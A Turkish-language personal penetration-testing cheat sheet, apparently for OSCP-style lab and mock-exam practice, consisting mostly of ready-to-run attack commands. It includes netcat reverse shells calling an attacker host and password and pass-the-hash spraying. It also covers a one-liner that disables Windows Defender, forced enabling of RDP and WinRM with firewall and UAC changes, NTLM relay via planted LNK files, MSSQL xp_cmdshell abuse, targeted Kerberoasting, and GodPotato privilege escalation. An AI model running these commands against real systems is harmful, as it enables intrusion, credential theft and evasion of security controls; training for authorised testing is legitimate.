kali                   windows 
nc -nlvp 443           .\nc.exe 10.10.16.6 443 -e powershell.exe

crackmapexec smb 192.168.110.51-56 -u James -d . -H 8************************a   --> yerel kullanıcı olarak çalıştır demek 

 ForceChangePassword permission

RDP etkinmleştirme 
*Evil-WinRM* PS C:\Users\Blake\Documents> 	Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

FIREWALL RDP trafiğine izin verme 
*Evil-WinRM* PS C:\Users\Blake\Documents> 	New-NetFirewallRule -DisplayName "Remote Desktop" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389

password spray yaparken yerel kullanıcı olarak da çalıştırmayı dene 

bunun parola karşılığını bul 
crackmapexec smb 192.168.110.51-56  -u James -d . -H 8af1903d3c80d3552a84b6ba296db2ea 
```

NXC CONNECTIONS

```jsx
# Tek parola ile çok sayıda kullanıcıyı test etmek (klasik password spray)
nxc smb IP -u users.txt -p Password123!

# Domain ortamında password spray yapmak (AD için önerilen)
nxc smb IP -d DOMAIN -u users.txt -p Password123!

# Birden fazla IP veya subnet’e aynı anda spray yapmak
nxc smb targets.txt -d DOMAIN -u users.txt -p Password123!

# Birden fazla parola denemek (lockout riski yüksek)
nxc smb IP -d DOMAIN -u users.txt -p passwords.txt

# Başarılı login sonuçlarını dosyaya kaydetmek
nxc smb IP -d DOMAIN -u users.txt -p Password123! --log spray.txt

# Sadece başarılı sonuçları göstererek çıktıyı sadeleştirmek
nxc smb IP -d DOMAIN -u users.txt -p Password123! --no-bruteforce

# Null session (boş kullanıcı ve parola) kontrolü
nxc smb IP -u  -p

# Guest hesabı ile erişim olup olmadığını kontrol etmek
nxc smb IP -u guest -p

# Spray sırasında admin yetkisi olan kullanıcıları tespit etmek
nxc smb IP -d DOMAIN -u users.txt -p Password123! --admin

# NTLM hash kullanarak Pass-the-Hash spray yapmak
nxc smb IP -d DOMAIN -u users.txt -H NTLM_HASH

# Spray sonrası erişilebilir SMB paylaşımlarını listelemek
nxc smb IP -d DOMAIN -u users.txt -p Password123! --shares

# Spray sonrası hangi kullanıcıların nerede oturum açtığını görmek
nxc smb IP -d DOMAIN -u users.txt -p Password123! --sessions
```

KERBRUTE

```jsx
örnek
./kerbrute_linux_amd64 userenum -d mockexam.com --dc 192.168.157.40 /home/kali/Desktop/TOOLS/SecLists/Usernames/xato-net-10-million-usernames.txt
./kerbrute_linux_amd64 userenum -d mockexam.com --dc 192.168.243.21 /home/kali/Desktop/TOOLS/SecLists/Usernames/xato-net-10-million-usernames.txt

# AD ortamında geçerli kullanıcıları Kerberos üzerinden tespit etmek (en kritik kullanım)
./kerbrute_linux_amd64 userenum -d DOMAIN --dc DC_IP users.txt

# Büyük wordlist ile kullanıcı enumeration yapmak (naming convention bilinmiyorsa)
./kerbrute_linux_amd64 userenum -d DOMAIN --dc DC_IP /path/to/wordlist.txt

# Enumeration sonucu bulunan geçerli kullanıcıları dosyaya yazmak
./kerbrute_linux_amd64 userenum -d DOMAIN --dc DC_IP users.txt -o valid_users.txt

# Tek parola ile password spray yapmak (lockout riski düşük)
./kerbrute_linux_amd64 passwordspray -d DOMAIN --dc DC_IP users.txt Password123!

# Password spray sonucunu dosyaya kaydetmek
./kerbrute_linux_amd64 passwordspray -d DOMAIN --dc DC_IP users.txt Password123! -o spray.txt

# Tek kullanıcıya çok sayıda parola denemek (yüksek lockout riski, OSCP’de nadiren)
./kerbrute_linux_amd64 bruteuser -d DOMAIN --dc DC_IP passwords.txt username

# Enumeration işlemini yavaşlatarak daha sessiz hale getirmek
./kerbrute_linux_amd64 userenum -d DOMAIN --dc DC_IP users.txt --delay 200ms

# Daha detaylı çıktı almak (debug / verbose mod)
./kerbrute_linux_amd64 userenum -d DOMAIN --dc DC_IP users.txt -v
```

AVR - DEFENDER VS KAPATMA

```jsx
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableCatchupFullScan $true -DisableCatchupQuickScan $true -DisableIntrusionPreventionSystem $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableScanningNetworkFiles $true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```

spray

```jsx
eğer hash lokal adminse 

eğer domain kullanıcısına ait hash ise 
nxc winrm 192.168.193.95 -u users.txt -H hashes.txt

eğer hash lokal adminse 
nxc winrm 192.168.193.95 -u users.txt -H hashes.txt --local-auth --continue-on-success    bu tüm kombinasyonları dener 

Hash nereden geldi?
|	
├── SAM (local machine)  →  --local-auth        
					
tek kullanıcı: hash			nxc winrm 192.168.193.95 -u Administrator -H a***************************** --local-auth
kullanıcı adı: hash spray               nxc winrm 192.168.193.95 -u users.txt -H hashes.txt --local-auth --continue-on-success
tek kullanıcı adı: parola		nxc winrm 192.168.193.95 -u backupsvc -p 'Password123!' --local-auth
kullanıcı adı: parola spray             nxc winrm 192.168.193.95 -u users.txt -p passwords.txt --local-auth --continue-on-success
							      ./24
   
|
└── NTDS (domain)        →  default (domain context)	

tek kullanıcı: hash 			nxc winrm 192.168.193.95 -u Administrator -H a**************************************
kullanıcı adı: hash spray		nxc winrm 192.168.193.95 -u users.txt -H hashes.txt --continue-on-succes 
tek kullanıcı adı: parola		nxc winrm 192.168.193.95 -u backupsvc -p 'Password123!'
kullanıcı adı: parola spray     	nxc winrm 192.168.193.95 -u users.txt -p passwords.txt --continue-on-success
							      ./24

----
rev shell

# Kali'de listener
nc -lvnp 4444

# Windows CMD'de
nc.exe 192.168.45.177 4444 -e cmd.exe
```

evil -winrm servisini açma - system veya administrator yetki gerektirir

```powershell
# 1. Ağ profilini Private (Özel) yap (Public profildeki güvenlik duvarı hatasını aşar)
Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private

# 2. WinRM servisini hızlıca yapılandır ve sessizce başlat
winrm quickconfig -quiet

# 3. Servisin her zaman otomatik başlamasını sağla ve çalıştır
Set-Service -Name WinRM -StartupType Automatic
Start-Service -Name WinRM

# 4. Firewall üzerinden 5985 (HTTP) portuna izin ver (Garantiye almak için Any profiliyle)
New-NetFirewallRule -Name "WinRM_HTTP_Manual" -DisplayName "Allow WinRM HTTP" -Direction Inbound -LocalPort 5985 -Protocol TCP -Action Allow -Profile Any

# 5. UAC Uzaktan Erişim Kısıtlamasını Kaldır (Local Admin hesaplarıyla bağlanabilmek için kritik)
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWORD -Force

# 6. Dinleyicinin (Listener) başarılı bir şekilde oluştuğunu doğrula
winrm enumerate winrm/config/listener
```

Kaçış karakterleri

```
cmd /c Nedir?
Windows'ta cmd.exe (Komut İstemi) iki ana parametre ile çalıştırılır:

/k (Keep): Komutu çalıştırır ve pencereyi açık tutar.
/c (Carry out): Komutu çalıştırır ve işi biter bitmez kapanır.
\"...\" -> Terminale diyoruz ki: "Şu dosyayı oku (type)". Dosya yolundaki boşluklar yüzünden tırnak kullanıyoruz ama dışarıdaki tırnaklarla karışmasın diye \" şeklinde kaçırıyoruz.
```

File extensions

```jsx
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
.asp
.aspx
.bat
.c
.cfm
.cgi
.css
.com
.dll
.exe
.hta
.htm
.html
.inc
.jhtml
.js
.jsa
.json
.jsp
.log
.mdb
.nsf
.pcap
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.pht
.phtml
.pl
.phar
.rb
.reg
.sh
.shtml
.sql
.swf
.txt
.xml
```

PASSWORD-PAROLA ENUM

```
geçmiş şifreleri görüntüleme  - powershell - 
(Get-PSReadlineOption).HistorySavePath

windows terminal history
PS C:\\Users\\Administrator> (Get-PSReadlineOption).HistorySavePath


powershellde env içinden parola ayıklama 
dir env:
```

generic write

```bash
./targetedKerberoast.py -v -d 'mock.exam' -u 'burak.dirlik' -p 'passw0rd1'
```

ntlm relay olayı

```bash
NTLM RELAY İLE HASH DÜŞÜRME SENARYOSU 
nxc smb 192.168.100.100 -u 'burak.dirlik' -p 'passw0rd1' -M slinky -o SERVER=burası_kali_ip NAME=README
	SMB         192.168.121.173 445    MS01             IPC$            READ            Remote IPC
	SLINKY      192.168.121.173 445    MS01             [+] Found writable share: Apps
	SLINKY      192.168.121.173 445    MS01             [+] Created LNK file on the Apps share
 

smbclient //192.168.100.100/Apps/ -U 'mock.exam/burak.dirlik'
	Password for [LASER.COM\Eric.Wallows]:
	Try "help" to get a list of possible commands.
	smb: \> dir

	README.lnk bu dosyayı görmen lazım

nxc smb 192.168.100.100-103 -u 'burak.dirlik' -p 'passw0rd1' --gen-relay-list smb_targets.txt
smb signing false olanları smb_targets.txt dosyasına yazman lazım 
 
cat smb_targets.txt
	192.168.100.100
	192.168.100.101

┌──(kali🎃kali)-[~/oscp]
└─$ impacket-ntlmrelayx --no-http-server -smb2support -tf smb_targets.txt
```

```bash
smb içine birşey koyabiliyorsan uri file attack denenebilir, 

### **Yöntem A: xp_cmdshell (Favori)**

`EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami'; -- Test`

### **Yöntem B: OLE Automation (xp_cmdshell kapalıysa)**

`EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @s INT; EXEC sp_oacreate 'wscript.shell', @s OUT;
EXEC sp_oamethod @s, 'run', NULL, 'cmd.exe /c whoami';`

## --- MSSQL ENUMERATION & EXPLOITATION CHEAT SHEET ---

# 1. Baglanti Kurma (Impacket)
impacket-mssqlclient DOMAIN/user:password@TARGET_IP -windows-auth

# 2. Veritabanlarini ve Yetkileri Listeleme
enum_db
SELECT is_srvrolemember('sysadmin'); -- 1 donerse kral sensin

# 3. Kimlige Burunme (Impersonation) Kontrolu
# Bu sorgu, hangi kullanicilara gecis yapabilecegini gosterir
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

# 4. Kimlige Burunme Islemi
EXECUTE AS LOGIN = 'hedef_kullanici';
SELECT SYSTEM_USER; -- Kim oldugunu dogrula
use hedef_veritabani;

# 5. Tablolari ve Kolonlari Listeleme (Veri Sizdirma)
SELECT * FROM INFORMATION_SCHEMA.TABLES; -- Tablolari gor
SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'tablo_adi'; -- Kolonlari gor
SELECT * FROM tablo_adi; -- Veriyi cek

# 6. Komut Calistirma (xp_cmdshell) - Eger sysadmin isen veya yetki yukselttiysen
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell 'whoami';

# 7. Elde Edilen Bilgileri Domainde Deneme (Pivot)
# SQL'den buldugun her parolayi CME ile tum agda dene!
crackmapexec smb IP_RANGE -u 'bulunan_user' -p 'bulunan_pass' --shares
crackmapexec winrm IP_RANGE -u 'bulunan_user' -p 'bulunan_pass'

----------------------

targeted kerberosting 
└─# python3 targetedKerberoast.py -v -d 'mockexam.com' -u 'test-service' -p 'UnadfsdfsdfRunny' --dc-ip 192.168.201.40      

KALİ
102.168.45.177

192.168.214.147 MS01 PİVOT
10.10.174.147

10.10.174.148 MS02

ms02 de topken impersonation ile yetik yükseltilebiliyor,
benim kullandığım normalde yetki yükseltme komutu şu, token impersonation için 
.\\GodPotato-NET4.exe -cmd ".\\nc.exe 192.168.45.177 1337 -e cmd.exe"	  Ama bu tünel gerektirmeyen bir ortam için

MS01 192.168.214.147  üzerinden tünel yapıyorum
listener olarak 80 ve 1337 portlarını belirledim portunu belirledim

.\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.174.147 1337"
.\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.174.147 80"

godpotato için illa 1337 lazım değil 80 443 boştaysa onları da kullanabilirsin 

windows old klasötrü varsa kesinlikle orda bişeyler var 
                   
```
